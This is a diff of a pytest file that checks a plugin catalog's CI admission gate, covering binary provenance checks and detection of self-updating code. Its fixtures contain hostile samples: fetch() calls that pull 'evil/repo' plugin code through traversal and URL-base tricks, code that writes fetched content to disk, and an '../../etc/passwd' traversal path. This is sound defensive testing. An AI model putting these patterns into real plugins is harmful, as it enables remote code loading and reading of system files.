@@ -1,7 +1,8 @@
 """The catalog admission gate must validate the pinned clone's own files only.
 
-These tests execute the real ``run:`` blocks of plugin-catalog-ci.yml against
-fixture git repos: the changed-entries step against a PR merge commit, and the
+These tests execute the real ``run:`` lines of plugin-catalog-ci.yml (each calls a
+``scripts/ci/catalog_*.py`` script under ``$GITHUB_WORKSPACE``) against fixture git
+repos: the changed-entries step against a PR merge commit, and the
 pinned-source step against an origin repo served under an https URL through a
 git ``url.insteadOf`` rewrite. One case per closed bypass, plus the legitimate
 flows that must keep passing.
@@ -204,6 +205,130 @@ def test_bypass_fails_the_gate(tmp_path, origin, case):
     assert not any(line.startswith("::error::forged") for line in res.stdout.splitlines())
 
 
+def _attested_binary(origin: Path) -> str:
+    """Commit a PE binary at plugin/runtime/host.exe and return its catalog path."""
+    (origin / "plugin" / "runtime").mkdir()
+    (origin / "plugin" / "runtime" / "host.exe").write_bytes(b"MZ\x90\x00" + b"\x00" * 64)
+    _commit(origin)
+    return "runtime/host.exe"
+
+
+def _gh_stub(tmp_path: Path, rc: int) -> Path:
+    """A `gh` that records its argv and answers `attestation verify` with ``rc``."""
+    log = tmp_path / "gh.calls"
+    bin_dir = tmp_path / "bin"
+    bin_dir.mkdir(exist_ok=True)
+    stub = bin_dir / "gh"
+    stub.write_text(f'#!/bin/sh\nprintf "%s\\n" "$*" >> "{log}"\nexit {rc}\n', encoding="utf-8")
+    stub.chmod(0o755)
+    return log
+
+
+def test_an_attested_binary_is_verified_against_the_pin_and_then_allowed(tmp_path, origin):
+    path = _attested_binary(origin)
+    sha = _git(origin, "rev-parse", "HEAD")
+    log = _gh_stub(tmp_path, 0)
+    entry = _entry(tmp_path, "ok.yaml", sha, attested_binaries=[path])
+    res = _gate(tmp_path, origin, [entry])
+    assert res.returncode == 0, res.stdout + res.stderr
+    assert f"PASS: {entry}" in res.stdout
+    [call] = log.read_text(encoding="utf-8").splitlines()
+    # The gate strips only a github.com prefix from the repo, so the fixture URL passes whole.
+    assert call.startswith("attestation verify ")
+    assert call.endswith(f"/plugin/{path} --repo {REPO_URL} --source-digest {sha} "
+                         "--predicate-type https://slsa.dev/provenance/v1")
+
+
+def test_an_attested_binary_without_provenance_fails_the_gate(tmp_path, origin):
+    path = _attested_binary(origin)
+    _gh_stub(tmp_path, 1)
+    entry = _entry(tmp_path, "evil.yaml", _git(origin, "rev-parse", "HEAD"), attested_binaries=[path])
+    res = _gate(tmp_path, origin, [entry])
+    assert res.returncode != 0
+    assert "no build-provenance attestation for runtime/host.exe" in res.stdout
+    assert "PASS" not in res.stdout
+
+
+def test_an_attested_self_updater_still_fails_the_self_updater_gate(tmp_path, origin):
+    # Provenance proves origin, not behaviour: listing an updater script as attested must not
+    # remove it from the tree the self-updater gate reads.
+    (origin / "plugin" / "update.js").write_text(
+        "fetch('releases/latest'); fs.writeFileSync(target, body)\n", encoding="utf-8")
+    _commit(origin)
+    _gh_stub(tmp_path, 0)
+    entry = _entry(tmp_path, "evil.yaml", _git(origin, "rev-parse", "HEAD"),
+                   attested_binaries=["update.js"])
+    res = _gate(tmp_path, origin, [entry])
+    assert res.returncode != 0
+    assert "self-updating code" in res.stdout
+    assert "PASS" not in res.stdout
+
+
+@pytest.mark.parametrize("declaration", [
+    '{$id: "https://raw.githubusercontent.com/ajv-validator/ajv/master/lib/refs/data.json#"}',
+    '{"$id": "https://raw.githubusercontent.com/ajv-validator/ajv/master/lib/refs/data.json#"}',
+    '{$id:"https://raw.githubusercontent.com/ajv-validator/ajv/master/lib/refs/data.json#"}',
+    "{$ref: 'https://raw.githubusercontent.com/ajv-validator/ajv/master/lib/refs/data.json#'}",
+], ids=["spaced", "quoted-key", "minified", "ref-single-quote"])
+def test_ajv_bundled_meta_schema_url_is_not_a_self_updater(tmp_path, origin, declaration):
+    # ajv ships its draft-06 meta-schema with $id/$ref pointing at a raw.githubusercontent.com
+    # URL, in whatever quoting/spacing the bundler emitted. The string is an inert JSON-schema
+    # identifier ajv matches by value against its own in-memory schema -- it never drives a
+    # request -- so a plugin that bundles ajv AND writes its own data files (both halves in one
+    # bundled file) must still pass.
+    (origin / "plugin" / "bundle.js").write_text(
+        f"{declaration}\nfs.writeFileSync(target, body)\n", encoding="utf-8")
+    sha = _commit(origin)
+    entry = _entry(tmp_path, "ok.yaml", sha)
+    res = _gate(tmp_path, origin, [entry])
+    assert res.returncode == 0, res.stdout + res.stderr
+    assert f"PASS: {entry}" in res.stdout
+
+
+_AJV_ID = "https://raw.githubusercontent.com/ajv-validator/ajv/master/lib/refs/data.json#"
+
+
+@pytest.mark.parametrize("source", [
+    # a traversal out of lib/refs
+    "fetch('https://raw.githubusercontent.com/ajv-validator/ajv/master/lib/refs/../../payload.js')",
+    # a traversal out of data.json itself: only the "#" ends the exempt id
+    "fetch('https://raw.githubusercontent.com/ajv-validator/ajv/master/lib/refs/data.json"
+    "/../../../../../../evil/repo/main/plugin.js')",
+    # the exempt id must not hide a real fetch after it on the same minified line
+    f"{{$id:'{_AJV_ID}'}};fetch('https://raw.githubusercontent.com/o/r/main/plugin.js')",
+    # the exempt literal reused as an executable fetch base, not a schema declaration
+    f"const u = new URL('/evil/repo/main/plugin.js', '{_AJV_ID}'); fetch(u)",
+    # ... or returned by an arrow function whose parameter happens to be named $id: `=>` is not a
+    # declaration separator, so the id is not stripped and the real fetch still shows
+    f"const f = $id => '{_AJV_ID}'; fetch(new URL('/evil/repo/main/plugin.js', f()))",
+    # only ajv's own id is inert: any other raw.githubusercontent URL in a $id still counts
+    "const s = {$id: 'https://raw.githubusercontent.com/o/r/main/plugin.js'}; fetch(s.$id)",
+], ids=["refs_traversal", "data_json_traversal", "beside_ajv_id", "fetch_base", "arrow_fn_base",
+        "other_url_declared"])
+def test_a_real_fetch_near_or_disguised_as_the_ajv_id_still_fails(tmp_path, origin, source):
+    # The exemption removes ONLY the inert ajv $id/$ref declaration; any real GitHub fetch that
+    # remains -- a sibling/traversal path, a fetch beside the id, or the id reused as a fetch
+    # base -- still trips the gate.
+    (origin / "plugin" / "sneaky.js").write_text(
+        f"{source}\nfs.writeFileSync(target, body)\n", encoding="utf-8")
+    sha = _commit(origin)
+    entry = _entry(tmp_path, "evil.yaml", sha)
+    res = _gate(tmp_path, origin, [entry])
+    assert res.returncode != 0
+    assert "self-updating code" in res.stdout
+    assert "PASS" not in res.stdout
+
+
+def test_an_attested_binaries_path_that_climbs_out_fails_the_gate(tmp_path, origin):
+    log = _gh_stub(tmp_path, 0)
+    entry = _entry(tmp_path, "evil.yaml", _git(origin, "rev-parse", "HEAD"),
+                   attested_binaries=["../../etc/passwd"])
+    res = _gate(tmp_path, origin, [entry])
+    assert res.returncode != 0
+    assert "is not a plain relative path" in res.stdout
+    assert not log.exists()
+
+
 def test_one_entry_cannot_skip_or_impersonate_the_others(tmp_path, origin):
     """Plugin code that drains stdin must not consume the remaining entry list,
     and an entry whose parser dies must fail itself rather than inherit the
@@ -316,8 +441,9 @@ def test_changed_entries_step(tmp_path, change, rc, listed, text):
     _git(repo, "update-ref", "refs/remotes/origin/main", base)
     out = tmp_path / "gh-output.txt"
     out.touch()
-    res = _run(_step("Find changed catalog"), tmp_path, repo,
-               {**os.environ, "GITHUB_OUTPUT": str(out)})
+    res = _run(_step("Find changed catalog"), tmp_path, repo, {
+        **os.environ, "GITHUB_OUTPUT": str(out), "GITHUB_WORKSPACE": str(ROOT),
+        "PATH": f"{Path(sys.executable).parent}:{os.environ['PATH']}"})
     assert res.returncode == rc, res.stdout + res.stderr
     lines = out.read_text(encoding="utf-8").splitlines()
     assert [f for f in lines if f and "__EOF__" not in f and f != "files<<__EOF__"] == listed
@@ -341,19 +467,19 @@ def test_pr130_catalog_guard_predicate_matrix(tmp_path):
     base_only = _commit(repo, "base only")
     _git(repo, "merge", "-q", "--no-ff", "-m", "synthetic PR merge", "pr")
     script = _step("Find changed catalog")
-    first = "git merge-base --is-ancestor 1744a19e0df568c647e4f3ff9c37f2a284a282fb HEAD^2"
-    second = "git merge-base --is-ancestor e89d5b77529f282b5b0198f12c6848a88e85dfd0 HEAD^2"
+    first = "git merge-base --is-ancestor 7d9fd429d32e82cd4be90cd2fbe995054f43e2e3 HEAD^2"
+    second = "git merge-base --is-ancestor a0af667c876b0522b9cb6eb684d02f50a40ea7e5 HEAD^2"
     assert first in script and second in script
     # Replace only the ancestor pins. The branch name contains the upstream SHA,
     # so a raw SHA replace would also rewrite the allowlisted ref.
     script = script.replace(first, f"git merge-base --is-ancestor {upstream} HEAD^2")
     script = script.replace(second, f"git merge-base --is-ancestor {base} HEAD^2")
     correct = {"CATALOG_HEAD_REPO": "mekenthompson/hermes-agent",
-               "CATALOG_HEAD_REF": "house/reconcile-nous-1744a19e0df568c647e4f3ff9c37f2a284a282fb",
-               "CATALOG_PR_NUMBER": "134"}
+               "CATALOG_HEAD_REF": "house/reconcile-nous-7d9fd429d32e82cd4be90cd2fbe995054f43e2e3",
+               "CATALOG_PR_NUMBER": "236"}
     cases = [("authorized", correct, script, 0)]
     for key, bad in (("CATALOG_HEAD_REPO", "attacker/hermes-agent"),
-                     ("CATALOG_HEAD_REF", "hf457/other"), ("CATALOG_PR_NUMBER", "131")):
+                     ("CATALOG_HEAD_REF", "hf457/other"), ("CATALOG_PR_NUMBER", "235")):
         cases.append((key, {**correct, key: bad}, script, 1))
         cases.append(("missing " + key, {k: v for k, v in correct.items() if k != key}, script, 1))
     cases.append(("upstream not on head", correct, script.replace(upstream, base_only), 1))
